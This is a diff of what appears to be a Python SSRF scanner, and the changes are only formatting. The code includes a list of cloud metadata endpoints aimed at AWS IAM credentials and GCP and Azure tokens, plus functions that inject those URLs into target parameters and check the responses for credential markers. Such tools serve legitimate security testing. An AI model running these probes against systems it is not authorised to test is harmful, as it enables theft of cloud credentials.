@@ -41,24 +41,48 @@ PARAMS = [
 # ──────────── CLOUD METADATA ENDPOINTS ────────────
 CLOUD_METADATA = [
     # AWS IMDSv1
-    ("http://169.254.169.254/latest/meta-data/", "AWS_IMDSv1", ["ami-id", "instance-id", "local-ipv4"]),
+    (
+        "http://169.254.169.254/latest/meta-data/",
+        "AWS_IMDSv1",
+        ["ami-id", "instance-id", "local-ipv4"],
+    ),
     (
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "AWS_IAM_CREDS",
         ["AccessKeyId", "SecretAccessKey"],
     ),
-    ("http://169.254.169.254/latest/user-data/", "AWS_USER_DATA", ["#!", "password", "key"]),
-    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS_INSTANCE_ID", ["instanceId", "region"]),
+    (
+        "http://169.254.169.254/latest/user-data/",
+        "AWS_USER_DATA",
+        ["#!", "password", "key"],
+    ),
+    (
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "AWS_INSTANCE_ID",
+        ["instanceId", "region"],
+    ),
     # GCP
-    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP_PROJECT", ["project"]),
+    (
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        "GCP_PROJECT",
+        ["project"],
+    ),
     (
         "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "GCP_TOKEN",
         ["access_token"],
     ),
-    ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "GCP_ATTRIBUTES", ["ssh-keys"]),
+    (
+        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+        "GCP_ATTRIBUTES",
+        ["ssh-keys"],
+    ),
     # Azure
-    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_IMDS", ["vmId", "subscriptionId"]),
+    (
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "AZURE_IMDS",
+        ["vmId", "subscriptionId"],
+    ),
     (
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         "AZURE_TOKEN",
@@ -66,11 +90,19 @@ CLOUD_METADATA = [
     ),
     # DigitalOcean
     ("http://169.254.169.254/metadata/v1/", "DO_METADATA", ["droplet_id"]),
-    ("http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address", "DO_PRIVATE_IP", ["10."]),
+    (
+        "http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address",
+        "DO_PRIVATE_IP",
+        ["10."],
+    ),
     # Alibaba Cloud
     ("http://100.100.100.200/latest/meta-data/", "ALIBABA_METADATA", ["instance-id"]),
     # Oracle Cloud
-    ("http://169.254.169.254/opc/v2/instance/", "ORACLE_METADATA", ["availabilityDomain"]),
+    (
+        "http://169.254.169.254/opc/v2/instance/",
+        "ORACLE_METADATA",
+        ["availabilityDomain"],
+    ),
     # Kubernetes
     ("https://kubernetes.default.svc/api/v1/namespaces", "K8S_API", ["namespace"]),
     # ECS Container
@@ -139,7 +171,9 @@ def _get_baseline_latency(target):
     """Calcula a latência base do alvo para evitar falsos positivos time-based."""
     try:
         start = time.time()
-        requests.get(f"http://{target}/?url=http://non_existent_cascavel_123.local/", timeout=5)
+        requests.get(
+            f"http://{target}/?url=http://non_existent_cascavel_123.local/", timeout=5
+        )
         return time.time() - start
     except Exception:
         return 0.5
@@ -159,7 +193,10 @@ def _test_cloud_metadata(target, param):
             resp = requests.get(url, timeout=8, allow_redirects=True, headers=headers)
             if resp.status_code == 200:
                 resp_len = len(resp.text)
-                if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+                if (
+                    baseline_len > 0
+                    and abs(resp_len - baseline_len) / baseline_len < 0.05
+                ):
                     continue  # Falso positivo: Soft-404 genérico
 
                 for indicator in indicators:
@@ -197,7 +234,9 @@ def _test_localhost_bypass(target, param):
             resp = requests.get(url, timeout=6, allow_redirects=True)
             if resp.status_code == 200 and len(resp.text) > 50:
                 # Check if response is different from a normal 404/error
-                baseline = requests.get(f"http://{target}/?{param}=http://invalid.cascavel.test/", timeout=4)
+                baseline = requests.get(
+                    f"http://{target}/?{param}=http://invalid.cascavel.test/", timeout=4
+                )
                 if len(resp.text) != len(baseline.text):
                     vulns.append(
                         {
@@ -290,7 +329,10 @@ def _test_post_ssrf(target, param):
     for internal_url, label, indicators in CLOUD_METADATA[:3]:
         try:
             resp = requests.post(
-                f"http://{target}/", json={param: internal_url}, timeout=6, headers={"Content-Type": "application/json"}
+                f"http://{target}/",
+                json={param: internal_url},
+                timeout=6,
+                headers={"Content-Type": "application/json"},
             )
             resp_len = len(resp.text)
             if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
